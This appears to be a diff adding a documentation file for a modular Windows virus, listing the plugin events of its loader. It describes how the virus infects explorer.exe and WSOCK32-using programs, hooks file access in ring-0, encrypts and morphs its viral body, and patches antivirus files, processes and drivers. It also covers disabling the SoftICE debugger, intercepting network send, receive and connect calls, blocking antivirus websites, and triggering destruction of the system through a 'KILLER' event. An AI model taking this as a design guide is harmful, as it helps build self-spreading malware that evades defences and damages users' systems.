@@ -1,0 +1,118 @@
+
+event
+~~~~~
+EV_LDRWIN32_STARTUP, r3
+               called on startup.
+               if zero returned, free allocated memory,
+               otherwise, keep it;
+               then return to host program
+
+EV_LDRWIN32_ATTACHED, r3
+               new plugin(s) just attached, imports/exports recalculated,
+               maybe some other plugins has been enabled, etc.
+EV_LDRWIN32_DETACHED, r3
+               some plugin has been detached, --//--
+
+EV_LDRWIN32_SEHERROR, r3
+               some plugin caused SEH error and has been disabled;
+               all plugins that uses erroneous one are disabled too;
+               all imports/exports recalculated
+
+EV_PLAN_PER_MACHINE, r3
+               called if first execution on this machine.
+               This Event is called per each exectuion,
+               until some plugin will handle it (return non-zero);
+               then, registry key is set,
+               and event will not be called anymore
+
+EV_PLAN_PER_SESSION, r3
+               called if first execution per this session (after reboot).
+               This Event is called per each execution,
+               until some plugin will handle it (return non-zero);
+               then, global atom is added and event is not called
+               until next session
+
+EV_PLAN_PER_PROCESS, r3
+               called when any infected process is executed;
+               possible user_param values:
+                 PLAN_EXPLORER -- explorer.exe == will work main viral thread
+                 PLAN_WINSOCK  -- process that uses WSOCK32.DLL
+                 PLAN_ARCDROPPER -- dropper within archive
+                 PLAN_VIRDROPPER -- viral dropper
+                 PLAN_STDFILE  -- any other file
+
+EV_INFECTA_INFECTFILE, r3
+               used to perform fast infection of EXPLORER/WSOCK32,
+               but may be used for any other files;
+               called on EV_PLAN_PER_SESSION event, by INSTALL3 plugin
+
+EV_MAKEBODY_MORPH, r0/r3
+               called from MAKEBODY plugin, to perform encryption of
+               viral body; resulting buffer will be used in infection
+
+EV_MAIN_IDLE, r3
+               called by MAIN, in new r3 thread, in explorer.exe
+               use this event to perform viral actions.
+               *** called in CYCLE ***
+
+EV_R0COPY_IDLE, r0
+               called by R0COPY, when we're in just created r0 viral copy.
+               set up your r0 handlers on this event.
+               *** called ONCE ***
+
+EV_IFSHAN_GOT_FILENAME, r0
+               called by IFSHAN, in ring-0,
+               user_param = ptr to incoming asciiz file name
+
+EV_RECSERCH_GOT_FILENAME, r3
+               called by RECSERCH
+               user_param = ptr to found asciiz file name
+
+EV_REGSCAN_GOT_FILENAME, r3
+               called by REGSCAN
+               user_param = ptr to found asciiz string, probably file name
+               *** lots of duplicated names here ***
+
+EV_EXTMAN_GOT_FILENAME, r0/r3
+               this is main Event you must handle,
+               because EXTMAN plugin:
+               - collects all incoming EV_xxx_GOT_FILENAME events;
+               - fills win32_find_data structure (performs findfirst);
+               - extracts EXTension;
+               - determine if it is first usage of this filename, or not
+                 (using 256k bitset array, indexed by filename hashs)
+
+EV_IOHOOKER_ON_SEND, r3
+               hook before send(); user_param = stack frame ptr
+EV_IOHOOKER_ON_RECV, r3
+               hook after recv();
+                 user_param = offs { +0 DD stack frame ptr
+                                     +4 DD num_bytes_received }
+EV_IOHOOKER_ON_CONNECT, r3
+               hook before connect();
+               if handled, DENY connect (return error)
+
+EV_ADDPGN_GETKEY, r3
+               ADDPGN asks for RSA key with specified id==hash;
+               all RSA-key containers (K1,K2,...) hooks it
+
+
+
+EV_AAVFILE_PATCH, r3
+               generated when some AV file has been patched, on disk
+EV_WALKER_PATCHED, r3
+               generated when some AV r3 processes found & patched, in memory
+EV_KILLAVXD_PATCHED, r0
+               generated when some AV VxD's are patched, in memory
+EV_FUCKICE_PATCHED, r0
+               generated when soft-ice is detected & patched in memory
+               (int1/3 hooked)
+EV_FUCKICE_TRACING, r0
+               ---only if soft-ice is present and has been patched---
+               generated on each INT1/INT3, but before soft-ice's handlers
+EV_IOAVFILT_BLOCKED
+               generated when connection to AV site is blocked
+
+EV_KILLER_DO_FUCKUP
+               tell KILLER to perform system fuckup immediately
+
